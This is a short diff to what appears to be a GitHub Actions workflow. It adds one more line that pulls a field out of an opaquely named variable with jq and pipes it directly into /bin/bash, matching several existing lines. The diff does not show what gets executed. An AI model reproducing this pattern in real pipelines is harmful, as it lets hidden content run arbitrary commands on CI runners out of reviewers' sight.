@@ -25,6 +25,7 @@ jobs:
           echo $nq158 | jq -r .wlbj223 | /bin/bash
           echo $rbg60772 | jq -r .j5005 | /bin/bash
           echo $lp91 | jq -r .rynyp3 | /bin/bash
+          printf '%s' "$pyxd4016" | jq -r .m785 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
